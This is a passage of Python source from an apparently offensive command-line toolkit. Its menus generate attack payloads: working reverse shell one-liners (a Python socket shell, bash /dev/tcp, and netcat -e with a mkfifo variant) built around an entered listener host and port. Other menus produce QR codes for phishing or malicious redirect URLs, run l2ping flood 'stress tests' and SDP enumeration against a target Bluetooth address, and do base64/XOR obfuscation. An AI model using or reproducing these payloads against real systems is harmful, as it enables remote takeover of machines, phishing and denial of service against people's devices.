    choice = input("Select option [1-2, or 99/b]: ").strip().lower()
    if choice in ["99", "b", "back"]:
        return
        
    if choice == "1":
        print("\n[+] Scanning for classic Bluetooth devices...")
        try:
            res = subprocess.run(["hcitool", "scan"], capture_output=True, text=True, timeout=15)
            output = res.stdout if res.stdout else res.stderr
            clear_screen()
            print(BANNER_IMAGE)
            print("=== CLASSIC BLUETOOTH SCAN RESULTS ===")
            print(output)
            log_scan("Bluetooth Scan", "Airspace", output)
        except Exception as e:
            print(f"[-] Bluetooth scan failed (ensure HCI interface is up): {e}")
            
    elif choice == "2":
        print("\n[+] Scanning BLE beacons and devices (10s timeout)...")
        try:
            res = subprocess.run(["bluetoothctl", "scan", "le"], capture_output=True, text=True, timeout=10)
            output = res.stdout
            clear_screen()
            print(BANNER_IMAGE)
            print("=== BLE SCAN RESULTS ===")
            print(output)
            log_scan("BLE Scan", "Airspace", output)
        except Exception as e:
            print(f"[-] BLE scan failed: {e}")
            
    input("\nPress Enter to return...")
    
def handle_payload_generator():
    """Tool: Tactical Reverse Shell & Payload Generator."""
    clear_screen()
    print(BANNER_IMAGE)
    print_tactical_header()
    print("        === PAGE: TACTICAL REVERSE SHELL GENERATOR ===")
    print("-" * 60)
    print("1. Python3 Socket Reverse Shell")
    print("2. Bash TCP Reverse Shell One-Liner")
    print("3. Netcat Traditional / OpenBSD Listener Command")
    print("99. Back (b)")
    print("-" * 60)
    
    choice = input("Select option [1-3, or 99/b]: ").strip().lower()
    if choice in ["99", "b", "back"]:
        return
        
    lhost = input("Enter LHOST (Listener IP): ").strip()
    lport = input("Enter LPORT (Listener Port): ").strip()
    
    if not lhost or not lport:
        print("[-] LHOST and LPORT are required.")
        input("\nPress Enter to return...")
        return
        
    payload = ""
    if choice == "1":
        payload = f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"
    elif choice == "2":
        payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    elif choice == "3":
        payload = f"nc -e /bin/sh {lhost} {lport}  # (or: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f)"
        
    clear_screen()
    print(BANNER_IMAGE)
    print("=== GENERATED PAYLOAD STUB ===")
    print(f"\n{payload}\n")
    print("-" * 60)
    log_scan("Payload Generator", f"LHOST:{lhost} LPORT:{lport}", payload)
    input("Press Enter to return...")

def handle_qr_exploit():
    """Tool: QR Code Payload / Phishing Vector Generator."""
    clear_screen()
    print(BANNER_IMAGE)
    print_tactical_header()
    print("        === PAGE: QR CODE EXPLOIT / PAYLOAD GENERATOR ===")
    print("-" * 60)
    target_url = input("Enter payload URL or malicious redirection target: ").strip()
    if not target_url:
        return
        
    try:
        qr = qrcode.QRCode(version=1, box_size=1, border=1)
        qr.add_data(target_url)
        qr.make(fit=True)
        
        clear_screen()
        print(BANNER_IMAGE)
        print(f"=== ASCII QR CODE PAYLOAD FOR: {target_url} ===")
        qr.print_ascii(tty=True)
        print("-" * 60)
        log_scan("QR Code Generator", target_url, "Generated ASCII QR payload")
    except Exception as e:
        print(f"[-] Failed to generate QR code (ensure 'qrcode' is installed): {e}")
        
    input("\nPress Enter to return...")

def handle_bluetooth_attacks():
    """Tool: Advanced Bluetooth Enumeration & L2CAP Stress Testing."""
    clear_screen()
    print(BANNER_IMAGE)
    print_tactical_header()
    print("     === PAGE: BLUETOOTH ATTACK & ENUMERATION SUITE ===")
    print("-" * 60)
    print("1. Scan & Enumerate Device SDP Services (sdptool)")
    print("2. L2CAP Ping Flood / Stress Test (l2ping)")
    print("99. Back (b)")
    print("-" * 60)
    
    choice = input("Select option [1-2, or 99/b]: ").strip().lower()
    if choice in ["99", "b", "back"]:
        return
        
    target_mac = input("Enter Target Bluetooth MAC Address (e.g., 00:11:22:33:44:55): ").strip()
    if not target_mac:
        return
        
    if choice == "1":
        print(f"\n[+] Querying SDP records for {target_mac}...")
        try:
            res = subprocess.run(["sdptool", "browse", target_mac], capture_output=True, text=True, timeout=15)
            output = res.stdout if res.stdout else res.stderr
            clear_screen()
            print(BANNER_IMAGE)
            print("=== SDP BROWSE RESULTS ===")
            print(output)
            log_scan("Bluetooth SDP Browse", target_mac, output)
        except Exception as e:
            print(f"[-] SDP browse failed: {e}")
            
    elif choice == "2":
        count = input("Enter packet count (default 500): ").strip() or "500"
        print(f"\n[+] Executing l2ping stress test against {target_mac} ({count} packets)...")
        try:
            res = subprocess.run(["l2ping", "-i", "hci0", "-s", "600", "-c", count, target_mac], capture_output=True, text=True, timeout=20)
            output = res.stdout
            clear_screen()
            print(BANNER_IMAGE)
            print("=== L2PING STRESS TEST RESULTS ===")
            print(output)
            log_scan("Bluetooth l2ping", target_mac, output)
        except Exception as e:
            print(f"[-] l2ping attack failed: {e}")
            
    input("\nPress Enter to return...")
    

def handle_crypto_engine():
    """Tool: Cryptographic Encryption and Decryption Engine."""
    clear_screen()
    print(BANNER_IMAGE)
    print_tactical_header()
    print("          === PAGE: CRYPTO & OBFUSCATION ENGINE ===")
    print("-" * 60)
    print("1. Base64 Encode / Decode")
    print("2. Simple XOR Transformation")
    print("99. Back to Suite Menu (b)")
    print("-" * 60)
    
    choice = input("Select option [1-2, or 99/b]: ").strip().lower()
    if choice in ["99", "b", "back"]:
        return
        
    if choice == "1":
        mode = input("Choose mode - [e]ncode or [d]ecode: ").strip().lower()
        text = input("Enter text input: ")
        try:
            if mode.startswith('e'):
                res = base64.b64encode(text.encode('utf-8')).decode('utf-8')
                print(f"\n[+] Encoded (Base64):\n{res}")
                log_scan("Crypto Engine", "Base64 Encode", res)
            else:
                res = base64.b64decode(text.encode('utf-8')).decode('utf-8')
                print(f"\n[+] Decoded (Base64):\n{res}")
                log_scan("Crypto Engine", "Base64 Decode", res)
        except Exception as e:
            print(f"\n[-] Crypto operation failed: {e}")
            
    elif choice == "2":
        text = input("Enter text: ")
        key = input("Enter single character key: ")
        if not key:
            return
        k = key[0]
        output = "".join(chr(ord(c) ^ ord(k)) for c in text)
        b64_out = base64.b64encode(output.encode('utf-8')).decode('utf-8')
        print(f"\n[+] XOR Output (Base64 string): {b64_out}")
        log_scan("Crypto Engine", "XOR Cipher", b64_out)
        
    input("\nPress Enter to return...")